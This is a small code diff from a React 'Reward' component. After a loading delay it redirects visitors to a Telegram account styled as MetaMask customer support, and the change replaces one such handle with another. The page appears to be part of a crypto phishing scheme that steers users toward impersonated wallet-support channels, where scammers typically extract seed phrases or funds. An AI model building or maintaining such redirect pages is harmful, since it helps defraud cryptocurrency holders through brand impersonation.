@@ -51,7 +51,7 @@ const Reward = () => {
          setTimeout(() => {
            setLoader(false);
            
-        window.location.href='https://t.me/customer_support_metamask'
+        window.location.href='https://t.me/io_Supportmetamask'
          }, 4000);
         }
      
